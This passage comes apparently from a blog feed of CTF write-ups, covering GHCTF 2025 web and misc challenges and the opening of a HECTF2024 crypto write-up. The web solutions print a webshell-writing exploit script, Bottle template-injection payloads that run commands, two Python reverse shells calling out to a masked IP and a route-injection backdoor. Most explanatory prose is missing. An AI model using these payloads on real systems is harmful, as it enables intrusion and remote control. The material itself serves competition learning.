?&gt;.$content</code><code>base64</code><code>shell.php</code><code>phpexita</code><code>base64</code><code>php</code><strong></strong><code>PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg==</code><code>base64</code><code>&lt;?php eval($_POST[1]);?&gt;</code><strong>php</strong></p><p><code>flag</code></p><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;register.php&quot;</span>, data=data)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_response = session.post(url+<span class="string">&quot;login.php&quot;</span>, data=data)</span><br><span class="line">    shell = &#123;<span class="string">&quot;filename&quot;</span>: <span class="string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;</span>,<span class="string">&quot;txt&quot;</span>:<span class="string">&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;</span>&#125;</span><br><span class="line">    protected_response = session.post(url+<span class="string">&quot;dashboard.php&quot;</span>, data=shell)</span><br><span class="line">    response = requests.post(url+<span class="string">&quot;shell.php&quot;</span>, data=&#123;<span class="string">&quot;123&quot;</span>: <span class="string">&quot;system(&#x27;cat / flag&#x27;)&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://node2.anna.nssctf.cn:28932/&quot;</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure><h2 id="message-in-a-bottle"><a class="markdownIt-Anchor" href="#message-in-a-bottle"></a> Message in a Bottle</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, template, run</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">messages = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">message</span>):</span><br><span class="line">    message_items = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;message-card&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-content&quot;&gt;<span class="subst">&#123;msg&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;small class=&quot;message-time&quot;&gt;#<span class="subst">&#123;idx + <span class="number">1</span>&#125;</span> - &lt;/small&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> <span class="keyword">for</span> idx, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(message)])</span><br><span class="line"></span><br><span class="line">    board = <span class="string">f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;link href=&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;d-flex justify-content-between align-items-center mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1 class=&quot;mb-0&quot;&gt; &lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;a </span></span><br><span class="line"><span class="string">                    href=&quot;/Clean&quot; </span></span><br><span class="line"><span class="string">                    class=&quot;btn btn-danger&quot;</span></span><br><span class="line"><span class="string">                    onclick=&quot;return confirm(&#x27;&#x27;)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                     </span></span><br><span class="line"><span class="string">                &lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/submit&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;textarea </span></span><br><span class="line"><span class="string">                    name=&quot;message&quot; </span></span><br><span class="line"><span class="string">                    placeholder=&quot;payload&quot;</span></span><br><span class="line"><span class="string">                    required</span></span><br><span class="line"><span class="string">                &gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;button type=&quot;submit&quot; class=&quot;btn-custom&quot;&gt;&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-list mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-flex justify-content-between align-items-center mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h4 class=&quot;mb-0&quot;&gt;<span class="subst">&#123;<span class="built_in">len</span>(message)&#125;</span>&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    <span class="subst">&#123;<span class="string">f&#x27;&lt;small class=&quot;text-muted&quot;&gt;&lt;/small&gt;&#x27;</span> <span class="keyword">if</span> message <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                <span class="subst">&#123;message_items&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message.replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Clean&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clean</span>():</span><br><span class="line">    <span class="keyword">global</span> messages</span><br><span class="line">    messages = []</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/&quot;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    message = waf(request.forms.get(<span class="string">&#x27;message&#x27;</span>))</span><br><span class="line">    messages.append(message)</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run(app, host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure><p><strong></strong><code>waf</code><code>template</code><strong></strong></p><p><code>xss</code><code>xss</code><strong>cookie</strong>()</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#1 - <span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#2 - <span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;/div&gt;</code><code>bottle</code><strong>bottle</strong></p><p><a href="https://googlegroups.com/group/bottlepy/attach/60ddc96375306a0e/bottle-zh-cn.pdf?part=0.1"></a><strong>python</strong><code>%</code></p><p><code>&lt;div&gt;</code><code>&lt;div&gt;</code><code>&lt;/div&gt;</code><code>&lt;div&gt;</code><strong>python</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - &lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - &lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag &gt; 1.txt&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - &lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%include(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellpayload</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - &lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;8.x.x.x&#x27;,2333));[os.dup2(s.fileno(),i) for i in range(3)];p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&quot;</span></span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - &lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;8.x.x.x\&quot;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)&#x27;&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - &lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">% from bottle import Bottle, request</span><br><span class="line">% app=__import__(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br><span class="line">% app.route(<span class="string">&quot;/shell&quot;</span>,<span class="string">&quot;GET&quot;</span>,lambda :__import__(<span class="string">&#x27;os&#x27;</span>).popen(request.params.get(<span class="string">&#x27;cmd&#x27;</span>)).<span class="built_in">read</span>())</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br></pre></td></tr></table></figure><p><a href="https://forum.butian.net/share/4048"></a></p><p></p><h2 id="message-in-a-bottle-plus"><a class="markdownIt-Anchor" href="#message-in-a-bottle-plus"></a> Message in a Bottle plus</h2><p><code>%</code><code>waf</code><code>AST</code></p><p><code>python</code><code>% xxx</code>()<strong></strong><code>AST</code></p><p><code>payload</code><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">% from bottle import Bottle, request</span></span><br><span class="line"><span class="string">% app=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]</span></span><br><span class="line"><span class="string">% app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;cmd&#x27;)).read())</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="mybrave"><a class="markdownIt-Anchor" href="#mybrave"></a> mybrave</h2><p><strong>bkcrack</strong>()<strong>png</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -r 1..12 ?p</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -d mybrave.png</span><br></pre></td></tr></table></figure><p>12<br /><strong>base64</strong></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><ul><li><a href="https://seandictionary.top/ghctf-2025/">https://seandictionary.top/ghctf-2025/</a></li><li><a href="https://tover.xyz/">https://tover.xyz/</a></li><li><a href="https://tangcuxiaojikuai.xyz/">https://tangcuxiaojikuai.xyz/</a></li><li><a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">https://suhanhan-cpu.github.io/2025/03/19/2025 GHCTF Writeup/</a></li><li><a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw</a></li><li><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">https://www.cnblogs.com/EddieMurphy-blogs/p/18296185</a></li><li><a href="https://xyaxxya.github.io/posts/2b7eb6e9.html">https://xyaxxya.github.io/posts/2b7eb6e9.html</a></li><li><a href="https://hyggevv.github.io/2025/03/07/GHCTF2025">https://hyggevv.github.io/2025/03/07/GHCTF2025</a></li></ul><p></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;(bushi&lt;/p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#crypto&quot;&gt;&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Sagemath&lt;/str</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>&amp;&amp;HECTF2024</title>
    <link href="https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/"/>
    <id>https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/</id>
    <published>2024-12-08T15:48:30.000Z</published>
    <updated>2025-04-10T15:19:27.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><p><code>web</code>(<code>pwn</code>)<code>web</code><code></code>QWQ</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">p, q</span>):</span><br><span class="line">    public_key = p*p*q</span><br><span class="line">    e = public_key</span><br><span class="line">    n = p*q</span><br><span class="line">    phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    private_key = inverse(e,phi_n)</span><br><span class="line">    <span class="keyword">return</span> public_key,private_key,e</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">N,d,e = gen_key(p,q)</span><br><span class="line"></span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line"><span class="string">d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line"><span class="string">c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>Schmidt Samoa</code><a href="https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/">crypto-week4-RSA Variation II</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line">d = <span class="number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line">c = <span class="number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line">pq = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, d*N, N)-<span class="number">2</span>, N)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, pq))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ez_sign"><a class="markdownIt-Anchor" href="#ez_sign"></a> EZ_sign</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random,os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;***************&#125;&#x27;</span></span><br><span class="line">msg = <span class="string">b&#x27;e = ?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(powmod(g, k, p) % q)</span><br><span class="line">    H = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">    s = <span class="built_in">int</span>((H + r * x) * invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (H,r,s)</span><br><span class="line"></span><br><span class="line">k1 = getPrime(<span class="number">64</span>)</span><br><span class="line">k2 = k1 ** <span class="number">2</span></span><br><span class="line">pri = bytes_to_long(msg)</span><br><span class="line">a = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">b = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">pub = (a, b, g, y)</span><br><span class="line"></span><br><span class="line">H1, r1, s1 = sign(pub, pri, k1)</span><br><span class="line"></span><br><span class="line">H2, r2, s2 = sign(pub, pri, k2)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = powmod(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">C = p**<span class="number">2</span> + q**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H1, r1, s1) = <span class="subst">&#123;H1&#125;</span>, <span class="subst">&#123;r1&#125;</span>, <span class="subst">&#123;s1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H2, r2, s2) = <span class="subst">&#123;H2&#125;</span>, <span class="subst">&#123;r2&#125;</span>, <span class="subst">&#123;s2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(H1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640</span></span><br><span class="line"><span class="string">(H2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142</span></span><br><span class="line"><span class="string">c = 18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line"><span class="string">C = 179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>DSA</code><code>k</code><br /><img src="https://pic1.zhimg.com/80/v2-b9a34619a42f211a202b8fab91dd542a_1440w.png" alt="" /><br /><a href="http://www.cynthia99.link/index.php/archives/2426/"></a></p><p><code>sage</code><code>two_squares</code></p><p><br /><a href="https://xz.aliyun.com/t/15424"></a><br /><code></code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.solvers.diophantine.diophantine <span class="keyword">import</span> cornacchia</span><br><span class="line"></span><br><span class="line">p = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">q = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">(H1, r1, s1) = <span class="number">659787401883545685817457221852854226644541324571</span>, <span class="number">334878452864978819061930997065061937449464345411</span>, <span class="number">282119793273156214497433603026823910474682900640</span></span><br><span class="line">(H2, r2, s2) = <span class="number">156467414524100313878421798396433081456201599833</span>, <span class="number">584114556699509111695337565541829205336940360354</span>, <span class="number">827371522240921066790477048569787834877112159142</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(GF(q))</span><br><span class="line"></span><br><span class="line">f = s2*x^<span class="number">2</span>*r1 - s1*x*r2 - H2*r1 + H1*r2</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">int</span>(f.roots()[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">x = (s1*k - H1) * inverse(r1, q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x).decode())</span><br><span class="line">c = <span class="number">18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line">C = <span class="number">179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line">x1 = cornacchia(<span class="number">1</span>, <span class="number">1</span>, C)</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> x1:</span><br><span class="line">    <span class="keyword">assert</span> a**<span class="number">2</span>+b**<span class="number">2</span> == C</span><br><span class="line">    <span class="keyword">if</span> isPrime(a) <span class="keyword">and</span> isPrime(b):</span><br><span class="line">        p, q = a, b</span><br><span class="line">        <span class="built_in">print</span>(p,q)</span><br><span class="line">        n = p*q</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(e, phi)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><p>emmm<strong>Geek Challenge 2023 EzComplex</strong><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mi>i</mi><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mi>p</mi><mo></mo><mi>q</mi><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation 